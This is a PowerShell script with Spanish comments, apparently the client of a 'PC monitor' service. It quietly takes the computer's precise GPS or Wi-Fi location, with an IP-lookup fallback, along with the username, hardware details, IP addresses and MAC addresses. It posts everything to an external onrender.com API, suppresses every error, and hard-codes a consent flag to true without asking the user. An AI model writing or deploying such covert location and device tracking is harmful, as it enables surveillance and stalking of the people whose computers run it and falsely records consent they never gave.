# Configuración de API
$API_URL = "https://pc-monitor-api.onrender.com/api/collect"
$API_KEY = "PCMONITOR_CAMBIA_ESTA_CLAVE_2026"

$Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()

# 1. Obtención de Ubicación Nativa (Windows WinRT Location API)
$Lat = $Lon = $Precision = $FuenteUbic = $GoogleMaps = $null

try {
    # Cargar API Nativa de Ubicación de Windows
    [Windows.Devices.Geolocation.Geolocator, Windows.Devices.Geolocation, ContentType = WindowsRuntime] | Out-Null
    $Geolocator = New-Object Windows.Devices.Geolocation.Geolocator
    $Geolocator.DesiredAccuracyInMeters = 10

    # Solicitar posición con tiempo de espera de 10 segundos
    $AsyncOp = $Geolocator.GetGeopositionAsync()
    $cnt = 0
    while ($AsyncOp.Status -eq 'Started' -and $cnt -lt 100) {
        Start-Sleep -Milliseconds 100
        $cnt++
    }

    if ($AsyncOp.Status -eq 'Completed') {
        $Result = $AsyncOp.GetResults()
        $Lat        = [math]::Round($Result.Coordinate.Point.Position.Latitude, 6)
        $Lon        = [math]::Round($Result.Coordinate.Point.Position.Longitude, 6)
        $Precision  = [math]::Round($Result.Coordinate.Accuracy, 2)
        $FuenteUbic = "Windows Native Location (Wi-Fi/GPS Real Time)"
        $GoogleMaps = "https://www.google.com/maps?q=$Lat,$Lon"
    }
} catch {
    # Manejo en caso de bloqueo por privacidad o falta de sensor
}

# Fallback: Si el sensor de Windows no entregó coordenadas, recurrir a IP
if (-not $Lat) {
    $GeoIP = Try { Invoke-RestMethod -Uri "https://ipinfo.io/json" -TimeoutSec 5 } Catch { $null }
    if ($GeoIP -and $GeoIP.loc) {
        $coords     = $GeoIP.loc -split ","
        $Lat        = $coords[0]
        $Lon        = $coords[1]
        $Precision  = 5000
        $FuenteUbic = "ipinfo.io ($($GeoIP.city), $($GeoIP.country))"
        $GoogleMaps = "https://www.google.com/maps?q=$Lat,$Lon"
    }
}

# 2. Recopilación de Información del Sistema
$ComputerName = $env:COMPUTERNAME
$Username     = $env:USERNAME

$CPU          = (Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty Name)
$Manufacturer = (Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer)
$Model        = (Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty Model)
$OSName       = (Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
$OSVersion    = (Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Version)
$OSBuild      = (Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber)

$RAMBytes     = (Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty TotalPhysicalMemory)
$RAM_GB       = if ($RAMBytes) { [math]::Round($RAMBytes / 1GB, 2) } else { $null }

$Disks = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" | ForEach-Object {
    @{
        Unidad      = $_.DeviceID
        CapacidadGB = [math]::Round($_.Size / 1GB, 2)
        LibreGB     = [math]::Round($_.FreeSpace / 1GB, 2)
    }
}

$GPUs = Get-CimInstance Win32_VideoController | ForEach-Object {
    @{
        Nombre    = $_.Name
        MemoriaMB = [math]::Round($_.AdapterRAM / 1MB, 0)
        Driver    = $_.DriverVersion
    }
}

$IPConfig = Get-NetIPConfiguration | ForEach-Object {
    @{
        Adaptador = $_.InterfaceAlias
        IPv4      = @($_.IPv4Address.IPAddress)
    }
}

$NetAdapters = Get-NetAdapter | ForEach-Object {
    @{
        Nombre      = $_.Name
        Descripcion = $_.InterfaceDescription
        Estado      = $_.Status
        MAC         = $_.MacAddress
        Velocidad   = $_.LinkSpeed
    }
}

$Stopwatch.Stop()

# 3. Empaquetar y enviar a la API
$Report = @{
    NombreEquipo          = $ComputerName
    Equipo                = $ComputerName
    Usuario               = $Username
    NombreUsuario         = $Username
    Fabricante            = $Manufacturer
    Modelo                = $Model
    SistemaOperativo      = $OSName
    VersionWindows        = $OSVersion
    BuildWindows          = $OSBuild
    Procesador            = $CPU
    RAM_Total_GB          = $RAM_GB
    GPU                   = $GPUs
    Discos                = $Disks
    Latitud               = $Lat
    Longitud              = $Lon
    PrecisionMetros       = $Precision
    FuenteUbicacion       = $FuenteUbic
    GoogleMaps            = $GoogleMaps
    TiempoRecopilacionMs  = $Stopwatch.ElapsedMilliseconds
    AdaptadoresRed        = $NetAdapters
    ConfiguracionIP       = $IPConfig
    Consentimiento        = $true
}

$JsonPayload = $Report | ConvertTo-Json -Depth 5 -Compress
$Headers     = @{ "Content-Type" = "application/json; charset=utf-8"; "X-API-Key" = $API_KEY }

try {
    Invoke-RestMethod -Uri $API_URL -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($JsonPayload)) -Headers $Headers -TimeoutSec 30
} catch {}
